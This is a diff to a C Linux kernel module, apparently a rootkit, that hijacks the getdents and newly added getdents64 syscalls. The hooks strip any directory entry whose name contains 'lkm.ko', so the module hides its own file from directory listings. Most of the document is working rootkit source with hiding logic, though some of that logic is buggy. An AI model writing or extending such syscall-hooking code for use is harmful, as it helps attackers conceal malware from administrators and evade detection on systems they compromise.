@@ -21,7 +21,6 @@
 #include <linux/path.h>
 
 MODULE_LICENSE("GPL");
-
 #ifdef __i386__
 #define START_MEM   0xc0000000 //32bit kernel space
 #define END_MEM     0xd0000000
@@ -90,15 +89,17 @@ sudo rmmod lkm
 Makefile  lkm  lkm.ko
 */
 
+struct linux_dirent {
+    unsigned long   d_ino;
+    unsigned long   d_off;
+    unsigned short  d_reclen;
+    char            d_name[1];
+};
+
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 
 asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
-    struct linux_dirent {
-        ino_t          d_ino; //inode
-        off_t          d_off; //offset
-        unsigned short d_reclen; //record length
-        char           d_name[]; //filename
-    };
     char buf[count];
     int bpos,nread;
     struct linux_dirent *d,*nd;
@@ -112,12 +113,34 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
             d->d_off=(nd->d_off+d->d_off);
             d->d_reclen=(d->d_reclen+nd->d_reclen);
         }
+        //current->files->fd[fd]->f_dentry->d_inode->i_ino
         bpos += d->d_reclen; //next
     }
     copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //now put it back to userspace
-    //i suspect i'm meant to be kfree'ing here...
     return nread; //and return so the user process can use the getdents
 }
+
+asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+    char buf[count];
+    int bpos,nread;
+    struct linux_dirent64 *d,*nd;
+    char * hidefile = "lkm.ko"; //this is the substring of a filename we want to hide
+    nread = (*original_getdents64)(fd,dirp,count); //call the original function to get struct to manipulate
+    copy_from_user(buf,dirp,nread); //steal what getdents returned so we can traverse
+    for (bpos = 0; bpos < nread;) { //traverse...
+        d = (struct linux_dirent64 *) (buf + bpos);
+        nd = (struct linux_dirent64 *) (buf + bpos + d->d_reclen);
+        if (strstr(nd->d_name,hidefile)) { //if we have a substring match to hidefile, make the prev record point to next
+            d->d_off=(nd->d_off+d->d_off);
+            d->d_reclen=(d->d_reclen+nd->d_reclen);
+        }
+        //current->files->fd[fd]->f_dentry->d_inode->i_ino
+        bpos += d->d_reclen; //next
+    }
+    copy_to_user(dirp,(struct linux_dirent64 *)buf,sizeof(buf)); //now put it back to userspace
+    return nread; //and return so the user process can use the getdents
+}
+
 
 static int init(void) { //initial function, sets up syscall hijacking
     //struct module *myself = &__this_module; //hide gcc warning
